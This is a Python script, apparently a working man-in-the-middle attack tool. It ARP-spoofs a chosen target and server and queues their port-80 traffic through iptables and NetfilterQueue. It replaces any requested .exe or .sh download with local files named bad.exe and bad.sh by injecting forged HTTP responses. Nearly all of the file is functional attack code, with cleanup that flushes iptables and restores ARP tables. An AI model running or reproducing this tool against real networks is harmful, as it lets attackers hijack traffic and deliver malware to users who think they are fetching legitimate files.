import os
from scapy.all import *
from netfilterqueue import NetfilterQueue
import argparse
import threading
import netifaces
import time

# interface = netifaces.interfaces()[0] # Get interface
interface = "eth0"

finished = False

load_layer("http")

target_MAC, server_MAC = None, None

# Add NFQueue to forwarding rules
os.system('iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1')
print("\nAdded Forward rule")

# Parse the server and target IP arguments
parser = argparse.ArgumentParser(description='Get Target and Server') 
parser.add_argument('target_ip', type=str, help='Target IP')
parser.add_argument('server_ip', type=str, help='Server IP')
args = parser.parse_args() 


def ARP_loop(tar, ser):
    while not finished:
        send(ARP(op=2, pdst=ser, psrc=tar), iface=interface, verbose=False)
        time.sleep(3)

# Get MAC address for IP
def get_mac(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

    ans, unans = srp(arp_request, iface=interface, timeout=2, verbose=False)

    print(f"\nsent request for ip: {ip}")   
    for sent, received in ans:
        return received.hwsrc

    return None


# Callback for when receiving a HTTP packet
def HTTP_callback(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # get the requester's IP Address
        ip = packet[IP].src
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        print(f"\n[+] {ip} Requested {url} with {method}")

# Queue callback
def q_callback(packet):
    print("packet received")

    raw_pkt = packet.get_payload()
    pkt = IP(raw_pkt)
    if pkt.src == args.target_ip and pkt.dst == args.server_ip:
        if TCP in pkt:  
            tcp_pkt = pkt[TCP] 
            print(f"TCP Packet: {tcp_pkt.sport} -> {tcp_pkt.dport}")
            if tcp_pkt.dport == 80 and HTTPRequest in tcp_pkt:
                http_request = tcp_pkt[HTTPRequest] 
                path = http_request.Path.decode()
                if path[-4:] == ".exe" :
                    with open("./bad.exe", "rb") as file:
                        bad_content = file.read()

                    http_response = HTTPResponse(
                                        Http_Version=b'HTTP/1.1',
                                        Status_Code=b'200',
                                        Reason_Phrase=b'OK',
                                        Server=b'SimpleHTTP/0.6 Python/2.7.6',
                                        Content_Type=b'application/x-msdos-program',
                                        Content_Length=str(len(bad_content)).encode()
                                    )
                    response = IP(src=args.server_ip, dst=args.target_ip)/TCP(sport=tcp_pkt.dport, dport=tcp_pkt.sport,flags="FPA", seq=tcp_pkt.ack, ack=tcp_pkt.seq)
                    response = response / http_response / bad_content
                    send(response)
                elif path[-3:] == ".sh":
                    with open("./bad.sh", "rb") as file:
                        bad_content = file.read()

                    http_response = HTTPResponse(
                                        Http_Version=b'HTTP/1.1',
                                        Status_Code=b'200',
                                        Reason_Phrase=b'OK',
                                        Server=b'SimpleHTTP/0.6 Python/2.7.6',
                                        Content_Type=b'application/x-msdos-program',
                                        Content_Length=str(len(bad_content)).encode()
                                    )
                    response = IP(src=args.server_ip, dst=args.target_ip)/TCP(sport=tcp_pkt.dport, dport=tcp_pkt.sport,flags="FPA", seq=tcp_pkt.ack, ack=tcp_pkt.seq)
                    response = response / http_response / bad_content
                    send(response)

    packet.accept()                       

try:

    # Get the MAC of target and server to fix their ARP tables later
    target_MAC = get_mac(args.target_ip)
    print(f"\ntarget MAC: {target_MAC}")
    server_MAC = get_mac(args.server_ip)
    print(f"\nserver_MAC: {server_MAC}")

    # ARP Spoof in a loop
    thread1 = threading.Thread(target=ARP_loop, args=(args.server_ip, args.target_ip))
    thread1.daemon = True
    thread1.start()
    thread2 = threading.Thread(target=ARP_loop, args=(args.target_ip, args.server_ip))
    thread2.daemon = True
    thread2.start()
    print(f"\nSent ARPs")

    nfqueue = NetfilterQueue()                       
    nfqueue.bind(1, q_callback)    
    #Running filter queue                    
    nfqueue.run()                                      
except Exception as e:
    os.system('iptables -F')                     # flush all iptables rule
    finished = True  # Signal the thread to stop
    packet = ARP(op=2, pdst=args.server_ip, psrc=args.target_ip, hwsrc=target_MAC,hwdst=server_MAC)
    send(packet, iface=interface, count = 5)
    print(f"\nFixed server ARP table")
    packet = ARP(op=2, pdst=args.target_ip, psrc=args.server_ip, hwsrc=server_MAC, hwdst=target_MAC)
    send(packet, iface=interface, count = 5)
    print(f"\nFixed Client ARP table")
